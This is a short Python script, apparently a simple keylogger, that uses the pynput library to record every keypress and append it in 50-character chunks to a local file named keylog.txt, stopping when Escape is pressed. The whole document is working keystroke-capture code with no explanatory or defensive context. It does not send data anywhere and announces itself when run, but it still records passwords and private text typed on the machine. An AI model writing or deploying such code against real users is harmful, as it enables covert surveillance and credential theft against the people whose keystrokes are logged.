
import pynput.keyboard

log = ""

def on_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "

    if len(log) >= 50:
        write_log(log)
        log = ""

def write_log(log):
    with open("keylog.txt", "a") as f:
        f.write(log)

def on_release(key):
    
    if key == pynput.keyboard.Key.esc:
        return False

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("logger is running press esc to stop")
    listener.join() 
